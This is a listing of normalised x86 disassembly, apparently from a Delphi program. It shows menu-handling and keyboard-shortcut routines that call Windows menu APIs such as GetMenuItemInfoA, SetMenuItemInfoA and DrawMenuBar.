mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4041b8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4597e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45990a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4043e0
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4043e0
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404640
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40452c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459911
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4046c8
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4044a0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4043e0
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404640
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4044a0
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_459948
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_459de7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4041b8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459da8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_458d88
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4041b8
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459dee
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404144
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404144
lea eax [ ebp - 0x18 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
call sub_459f9c
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_458d98
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40452c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_459764
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_458d98
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458d98
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403390
mov eax [ ebp - 0x20 ]
call sub_403390
mov eax [ ebp - 0x14 ]
call sub_403390
mov eax [ ebp - 0xc ]
call sub_403390
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_459764
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4043e0
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_458d98
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45b8e8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_408108
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_404174
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c964
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c964
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_458d98
push eax
mov edx esi
mov eax ebx
call sub_458d98
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404640
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_408108
push ebp
mov eax [ ebp - 0x2c ]
call sub_459734
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_459734
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c964
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4041b8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458d98
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_458d98
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45b854
mov edx [ ebp - 0x40 ]
pop eax
call sub_404174
mov edx esi
mov eax ebx
call sub_458d98
push eax
mov edx esi
mov eax ebx
call sub_458d98
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4043e0
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404640
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4597e8
mov eax [ ebp - 0x18 ]
call sub_4043e0
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404680
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4046c8
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4597e8
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_459e44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_458d88
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_458d88
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_459fc8
test al al
je r-xdata
mov eax esi
call sub_458d88
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_458d98
call sub_459e20
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_458d98
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_458d98
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_458d98
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_458d98
call sub_459e20
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_458d98
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_458d98
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_458d98
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_458d98
call sub_459e20
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_459f9c
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_459f9c
and eax 0x7f
mov al [ eax + rw-data ]
sub_459fc8
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_459fc8
and eax 0x7f
mov al [ eax + rw-data ]
sub_459ff4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_456cdc
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_423aa8
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45ad20
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45a090
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403390
mov eax [ esi + 0x44 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_45a104
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45a104
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_456848
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45918c
mov eax ebx
pop esi
pop ebx
retn
sub_45a144
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_458d88
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_458d98
call sub_45a144
pop ecx
test al al
je r-xdata
sub_45a1dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45a144
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_456848
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45a20c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45a1dc
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45b5d8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45a27c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45a1dc
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45a298
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45a1dc
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_459948
mov ebx eax
xor edx edx
mov eax edi
call sub_459e44
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_4592b0
mov eax [ esi + 0x34 ]
call sub_4592b0
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_4571ec
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call DrawMenuBar
sub_45a384
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45a384
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45a4a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45a1dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4592b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45a374
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45a4d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42e5c4
xor eax eax
push ebp
push sub_45a5d6
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42e5c4
xor eax eax
push ebp
push sub_45a5ab
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45a384
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42e5bc
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a5dd
mov eax [ rw-data ]
call sub_42e5bc
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45a1dc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45a5fc
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45a980
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45a980
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45a6b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45ac54
mov eax ebx
call sub_408c28
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45a758
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45a6b8
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404390
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4045e0
lea edx [ ebp - 0x200 ]
call sub_408cec
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45a7ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45a85c
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45acfc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45acfc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45acfc
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45a868
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45a758
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45a7ec
mov eax ebx
call sub_45ad20
jmp r-xdata
sub_45a8d0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45a918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
